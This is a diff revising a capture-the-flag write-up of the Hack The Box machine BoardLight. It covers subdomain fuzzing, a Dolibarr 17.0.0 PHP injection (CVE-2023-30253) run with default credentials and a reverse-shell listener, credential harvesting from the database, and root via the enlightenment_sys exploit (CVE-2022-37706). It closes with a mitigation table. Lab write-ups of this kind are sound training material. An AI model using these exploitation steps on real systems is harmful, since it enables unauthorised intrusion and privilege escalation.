@@ -32,16 +32,15 @@ Let's head over to burp and check these requests out
 
 Interesting, normally any form submission would be a POST request, but we're seeing this as a GET request that just gives us the same page
 
-Since there the information we enter isn't going anywhere, there's not much we ca ndo here. Let's move on and see what we can find
+Since the information we enter isn't going anywhere, there's not much we can do. Let's proceed elsewhere
 
-I notice this checking out the HTML
+There's something in the HTML source code
 
 ![Portfolio](/assets/images/HTB%20-%20BoardLight/Portfolio%20PHP.png)
 
 A comment referencing `portfolio.php`. I tried navigating to that but the page does not exist. Perhaps it will come in use later?
 
 Checking our Nikto & Feroxbuster scan provided my autorecon discovered a nothing useful either
-
 
 ![board.htb](/assets/images/HTB%20-%20BoardLight/Board.htb.png)
 
@@ -53,27 +52,27 @@ sudo nano /etc/hosts
 
 ![hostname set](/assets/images/HTB%20-%20BoardLight/IP%20set.png)
 
-With this piece of information, let's enumeration dub domains as these boxes often use virtual hosting to serve multiple applications on the same server
+With this piece of information, let's enumerate any sub-domains that may exist
 
 ```bash
 ffuf -u http://board.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.board.htb" -fs 15949
 ```
 
-- `-fs` to filter the size of 15949, so our screen does not flooded
+- `-fs` to filter the size of 15949, so we only get valid responses
 
 ![CRM](/assets/images/HTB%20-%20BoardLight/CRM.png)
 
-We see the subdomain `crm`. Let's add that to our local dns file from earlier and navigate to that domain
+We see the subdomain `crm`. Let's add that to our local dns file from earlier so we can resolve that domain
 
 ![etchost2](/assets/images/HTB%20-%20BoardLight/etchosts2.png)
 
-Navigating to crm.board.htb shows us this page
+Navigating to crm.board.htb shows us this the following application
 
 ![Dolibarr](/assets/images/HTB%20-%20BoardLight/Dolibarr.png)
 
-Doing a quick google tells us this application Dolibarr is n open source ERP & CRM application.
+Doing a quick google tells us the application Dolibarr is n open source ERP & CRM application
 
-Anyway, the first thing we notice is a version number. Let's google this version number and see if any exploits come up
+The first thing we notice is a version number. Let's do some sesearch into this version `17.0.0`
 
 ![Exploit Found](/assets/images/HTB%20-%20BoardLight/Dolibarr%20Exploit%20Github.png)
 
@@ -83,23 +82,25 @@ The github exploit links to the following CVE related to the Dolibarr verson
 
 ![Dolibarr CVE](/assets/images/HTB%20-%20BoardLight/Dolibarr%20CVE.png)
 
-[CVE-2023-30253](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) tells us that an **authenticated** low privileged-user can preform PHP code injection.
+[CVE-2023-30253](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) tells us that an **authenticated** low privileged-user can preform PHP code injection
 
 The system in Dolibarr 17.0.0 checks for lowercase `<?php` tags only. So when a user enters something like `<?PHP>`, it bypasses the input validation
 
-First we need to login to the Dolibarr application. Googling the default credentials tells us the default username & password is `admin` so let's try that 
+First we need to login to the Dolibarr application. Googling the default credentials tells us the default username is `admin` so let's try admin admin
 
 ![Logged into Dolibarr](/assets/images/HTB%20-%20BoardLight/Logged%20into%20Dolibarr.png)
 
-Sure enough, the default login is still available. Now that we have a valid login, we can run the script
+The default login is still available. We can perform this PHP injection manually as we have access to the GUI or we can simply run this script that makes it a bit easier 
 
-First, let's download it
+I'm going to use the script in this writeup, but I showcase doing it manually on my YouTube walkthrough [here](https://www.youtube.com/watch?v=LAfERlbYfRk)
+
+Let's download the exploit
 
 ```bash
 git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/tree/main?tab=readme-ov-file
 ```
 
-Now let' start up our nc listener and proceed to run the script!
+Now let's start up our nc listener and proceed to run the script!
 
 ```bash
 python3 exploit.py http://example.com login password 127.0.0.1 9001
@@ -112,7 +113,7 @@ And we have a shell as ```www.data```
 As always, let's update our shell to a proper tty
 
 ```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")
+python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
 background the session with crtl + z
@@ -125,9 +126,9 @@ stty raw -ehco;fg
 export TERM=xterm
 ```
 
-Great, now we have a proper tty with more functionality. This Dolibarr application probably uses a database to store the data / login creds. We can simply google where Dolibarr stores this information by searching `Dolibarr database password`
+Great, now we have a proper tty with more functionality. This Dolibarr application uses a database to store the data / login creds. We can simply google where Dolibarr stores this information by searching `Dolibarr database password`
 
-I opted to use GPT to answer this queston
+I opted to use GPT to answer this question
 
 ![GPT Answer](/assets/images/HTB%20-%20BoardLight/GPT%20Answer.png)
 
@@ -148,7 +149,7 @@ netstat -tuln
 Now let's connect to the SQL database
 
 ```bash
-mysql -u username -p -h 127.0.0.1 -P 3306
+mysql -u dolibarrowner -p -h 127.0.0.1 -P 3306
 ```
 
 ![Connected](/assets/images/HTB%20-%20BoardLight/Connected%20to%20mysql.png)
@@ -188,11 +189,11 @@ su larissa
 
 ![Larissa](/assets/images/HTB%20-%20BoardLight/Larissa.png)
 
-And boom, we have user. Let's do some enumeration on this user:
+And boom, we have user. Let's do some enumeration on this user
 
-let's find sudo permissions with `sudo -l`:
+Let's find sudo permissions with `sudo -l`
 
-"User may not run sudo"
+`"User may not run sudo"`
 
 Okay, we can't run sudo. How about listing suid binaries with `find / -perm -4000 -type f 2>/dev/null`
 
@@ -204,26 +205,17 @@ Googling `Enlightenment` suid binary exploit leads us to the following exploit D
 
 ![Enlightenment EDB](/assets/images/HTB%20-%20BoardLight/Exploit%20DB%20Enlightenment.png)
 
-Reading the script, we see that this is CVE-2022-37706 & targets  the`enlightenment_sys` suid binary
+Reading the script, we see that this is CVE-2022-37706 & targets the `enlightenment_sys` suid binary
 
-The script will first look for the vulnerable enlightenment_sys binary. Then proceed to create a temp directory and shell script /tmp/exploit with /bin/sh with executable permissions. It then uses the enlightenment_sys to mount the temp directory, allowing for execution as root. Finally, it executes the shell script, gaining root access & cleans up the temp files and directories
+The vulnerability arises because the `enlightenment_sys` binary mishandles certain path names. It allows an attacker to exploit how it processes file paths that start with `/dev/..` which can be abused to trick the program into running commands with root privileges
 
-This exploit takes advantage of how enlightenment_sys handles pathname that start with /dev
+The script uses a combination of path traversal & command injection:
 
-The vulnerable code might look something like this. The strcpy function doesn't check the length of the input pathname, allowing an attacker to craft a specially long pathname that overflows the buffer
-
-```C
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-
-int main(int argc, char *argv[]) {
-    char pathname[256];
-    strcpy(pathname, argv[1]); // vulnerable to pathname manipulation
-    system(pathname); // executes the pathname with root privileges
-    return 0;
-}
-```
+- Finds the vulnerable binary and stores it as a variable
+- If found, sets up directories for the exploit
+- Creates a malicious script that spawns a shell
+- Runs the malicious exploit
+- Cleans up evidence of the exploit
 
 Copy the script and run it
 
@@ -239,13 +231,15 @@ GG, we've rooted BoardLight!
 
 | Vulnerability                                    | Mitigation                                                                                       |
 |--------------------------------------------------|--------------------------------------------------------------------------------------------------|
-| Outdated Dolibarr                       | Regularly update to latest versions and apply security patches                   |
-| Default Dolibarr Credentials   | Change Default Credentials                |
-| Stored DB Password in Cleartext | Encrypt configuration files / sensitive data
-| Exploitable Binary Utilized  | Regularly run package manager updates to ensure latest security patches on binaries  |
+| **Dolibarr 17.0.0 PHP Code Injection (CVE-2023-30253)** | **Update Dolibarr to the latest version where this vulnerability is patched. Regularly apply security updates and patches to prevent known exploits.** |
+| **Use of Default Credentials in Dolibarr**   | **Immediately change default credentials upon installation. Implement strong password policies, including complexity requirements and regular rotation.** |
+| **Database Credentials Stored in Plaintext** | **Secure sensitive configuration files by encrypting them or storing credentials in environment variables. Restrict file permissions to limit access.** |
+| **Vulnerable SUID Binary 'enlightenment_sys' (CVE-2022-37706)** | **Remove unnecessary SUID permissions from binaries. Regularly update and audit system packages to ensure all software is up-to-date and secure.** |
 
 ### Remediation References
 
-[NIST Guidelines for Password Policies](https://pages.nist.gov/800-63-3/sp800-63b.html)
-
-[OWASP Encrypting Data Cheat Sheat](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
+- [Dolibarr Security Advisories](https://www.dolibarr.org/security)
+- [NIST Guidelines for Password Policies](https://pages.nist.gov/800-63-3/sp800-63b.html)
+- [OWASP Configuration Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Configuration_Guidelines.html)
+- [CVE-2022-37706 Details and Mitigation](https://nvd.nist.gov/vuln/detail/CVE-2022-37706)
+- [Linux Privilege Escalation Best Practices](https://www.linuxsecurity.com/features/linux-privilege-escalation-best-practices)
